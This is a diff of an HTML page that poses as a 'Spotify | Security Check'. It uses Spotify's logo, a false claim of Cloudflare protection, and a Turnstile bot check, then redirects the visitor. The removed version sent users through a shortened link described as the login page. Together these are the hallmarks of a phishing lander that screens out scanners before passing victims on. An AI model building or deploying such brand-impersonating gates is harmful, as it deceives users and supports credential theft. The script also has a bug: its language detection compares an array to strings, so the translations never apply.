@@ -1,15 +1,93 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url='https://dub.sh/-spotify'" />
-    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify | Security Check</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0;
+            background-color: #ffffff;
+            color: #1a1f36;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 450px;
+        }
+        .logo { 
+            max-width: 200px; 
+            height: auto; 
+            margin-bottom: 20px; 
+        }
+        .message { font-size: 16px; margin-bottom: 25px; line-height: 1.5; color: #4f566b; }
+        .footer { margin-top: 40px; font-size: 11px; color: #a3acb9; }
+        #status { font-weight: bold; margin-top: 15px; color: #2d336b; }
     </style>
 </head>
 <body>
-    <p>Redirecting you to the login page... <br>
-       If nothing happens, <a href="https://dub.sh/-easy">click here</a>.</p>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Spotify_logo_with_text.svg/3840px-Spotify_logo_with_text.svg.png" class="logo">
+        
+        <div id="content-area">
+            <p class="message" id="lang-msg">Checking your connection to ensure a secure session...</p>
+        </div>
+        
+        <div class="cf-turnstile" 
+             data-sitekey="0x4AAAAAADRuJecGJ_d86D-t" 
+             data-callback="onSuccess"></div>
+             
+        <p id="status"></p>
+    </div>
+
+    <div class="footer">
+        System: Security Layer Managed by Cloudflare &bull; Hosted via GitHub
+    </div>
+
+    <script>
+        // Dictionary for Language Detection
+        const translations = {
+            'en': "Checking your connection to ensure a secure session...",
+            'de': "Wir überprüfen Ihre Verbindung, um eine sichere Sitzung zu gewährleisten...",
+            'fr': "Vérification de votre connexion pour garantir une session sécurisée...",
+            'success_en': "Verification successful. Redirecting...",
+            'success_de': "Verifizierung erfolgreich. Weiterleitung...",
+            'success_fr': "Vérification réussie. Redirection..."
+        };
+
+        // Detect Language
+        const userLang = navigator.language || navigator.userLanguage;
+        const shortLang = userLang.split('-'); // Gets 'en', 'de', etc.
+        const msgElement = document.getElementById('lang-msg');
+
+        // Set Initial Message
+        if (translations[shortLang]) {
+            msgElement.innerText = translations[shortLang];
+        }
+
+        // This triggers only after the bot check is passed
+        function onSuccess(token) {
+            const statusMsg = document.getElementById('status');
+            
+            // Set Success Message based on language
+            if (shortLang === 'de') statusMsg.innerText = translations.success_de;
+            else if (shortLang === 'fr') statusMsg.innerText = translations.success_fr;
+            else statusMsg.innerText = translations.success_en;
+            
+            // Redirect after 1 second
+            setTimeout(function() {
+                window.location.href = "https://google.com";
+            }, 1200);
+        }
+    </script>
 </body>
 </html>
